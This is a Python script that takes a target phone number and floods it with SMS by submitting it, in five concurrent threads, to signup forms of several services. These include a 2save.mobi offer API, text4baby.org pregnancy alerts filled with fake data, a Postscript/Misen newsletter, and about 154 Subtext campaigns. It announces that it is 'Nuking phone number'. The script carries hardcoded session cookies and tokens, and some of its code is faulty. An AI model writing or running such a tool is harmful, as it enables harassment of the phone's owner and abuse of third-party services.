import requests
import json
import random
import threading

def get_phone_number():
    number = input("Enter the phone number to use: ")
    return number

def whioNewsletter(number, tries=5):
    for i in range(int(tries)):
        response = requests.post("https://2save.mobi/go/site/offer/api/exec_signup.jsp?guid=E0AF89BC-AA29-0E74-E6E4-DFA40580602B", params={"customerAccountID": 83, "phoneNumber": str(number), "password": "xxxxx", "carrier": 78, "email": "SEDROPKIT-1d8%40protonmail.com", "search_3": "", "cb_484":1, "cb_483":1, "cb_482":1, "cb_481":1, "cb_480":1, "cb_479":1, "cb_478":1, "cb_477":1, "cb_476":1, "cb_475":1, "cb_474":1, "cb_473":1, "cb_472":1, "cb_471":1, "search_5":"", "cb_39911":1, "cb_11842":1, "cb_9029":1, "cb_9555": 1, "cb_9908":1, "agreement":1})
        return response.json()

def emailGen(domain):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    prefix = ""
    for i in range(5):
        index = random.randrange(0, len(alpha))
        prefix = prefix + alpha[index]
    email = prefix + domain
    return email

def text4BabyAlert(number):
    # unique email is required for each number so we generate one
    email = emailGen("@SETOOLKITBY1d8.com")
    headers = {
        'Host': 'text4baby.org',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json;charset=utf-8',
        '__RequestVerificationToken': '-eKQgmyK1Fdmasr5TwV-dSl6foo_3pI3F_3j7AND4_EpCMus67jl2wNsny50cRwKEew05d2zSeuWyBJMat50iHKrPW4v2BtgkzqCGO5c5lvXi9qvbv442HtSL-UcZUjXKfSw8w2',
        'Content-Length': '628',
        'Origin': 'https://text4baby.org',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://text4baby.org/SignUp',
        'Cookie': 'ASP.NET_SessionId=px53yp3zjj5fb45qatr5bsnu; T4Bcustinfo=AAEAAAD/////AQAAAAAAAAAMAgAAAEhUNEIuTW9kZWxzLkdsb2JhbCwgVmVyc2lvbj0x.0, image/webp,*/*;q=0.8',
        'Sec-GPC': '1',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache'
    }
    data = {
      "CustomerType": {
        "Selected": "false",
        "Text": "I am pregnant",
        "Value": "1"
      },
      "RbAns": "No",
      "BabyDueDate": "",
      "BabyBirthDate": "",
      "MenstrualDate": "03/15/2021",
      "DueBirthDate": "",
      "ZipCode": "90001",
      "EmailId": email,
      "MobileNo": number,
      "ParticipantCodeAns": "No",
      "ParticipantCode": "",
      "RbTermCondition": "true",
      "ParticipantId": "null",
      "ReferringURL": "https://text4baby.org/SignUp",
      "FirstName": "null",
      "LastName": "null",
      "HealthInsuranceAns": "null",
      "HealthInsuranceTypeAns": "null",
      "MedicaIdPlanName": {
        "Selected": "false",
        "Text": "null",
        "Value": "null"
      },
      "MedicaId": "null",
      "ValidationFieldText": "null",
      "ValidationFieldValue": "null",
      "VerificationCode": "null"
    }
    jsonData = json.dumps(data)
    response = requests.post("https://text4baby.org/SignUp/SaveSignUpDetails", headers=headers, data=jsonData)
    jsonResponse = response.json()
    if jsonResponse.get("error") is not None:
        return "error"
    else:
        return "success"

def misenNewsletter(number):
    headers = {
        'Host': 'api.postscript.io',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '46',
        'Origin': 'https://misen.com',
        'Pragma': 'no-cache',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://misen.com/',
        'Upgrade-Insecure-Requests': '1',
        'Sec-GPC': '1',
        'TE': 'Trailers',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache'
    }
    response = requests.post("https://api.postscript.io/subscribe/form", params={"shop_id":"4641", "keyword_id":"29981", "phone":number})
    
    try:
        responseJson = response.json()
        if "success" in responseJson and responseJson["success"] == True:
            return "success"
        else:
            return "error"
    except json.JSONDecodeError:
        return "error"

# can be ran multiple times & multiple SMS are sent
def subtext(number):
    url = "https://joinsubtext.com/campaign_subscriptions.json"
    fullNumber = "+1" + number
    
    for id in range(1, 155):
        response = requests.post(url, data={"utf8": "✓", "campaign_subscription[campaign_id]": str(id), "campaign_subscription[timezone_offset]": "America/Los_Angeles", "subscriber[phone_number]": number, "subscriber[full_phone_number]": fullNumber, "commit": "Continue"})

# Create a function to run the tasks concurrently
def run_tasks(phone_number, success_count, error_count):
    whio_result = whioNewsletter(phone_number)
    text4baby_result = text4BabyAlert(phone_number)
    misen_result = misenNewsletter(phone_number)
    subtext(phone_number)
    
    if whio_result == "success" and text4baby_result == "success" and misen_result == "success":
        success_count.append(1)
    else:
        error_count.append(1)

# Ask the user for the phone number
phone_number = get_phone_number()

# Create a list of threads
threads = []

# Number of concurrent tasks you want to run (adjust as needed)
num_threads = 5

# Lists to keep track of success and error counts
success_count = []
error_count = []

# Create and start the threads
for _ in range(num_threads):
    thread = threading.Thread(target=run_tasks, args=(phone_number, success_count, error_count))
    thread.start()
    threads.append(thread)

print("Nuking phone number, press Ctrl+C to stop the program.")

# Wait for all threads to finish
for thread in threads:
    thread.join()

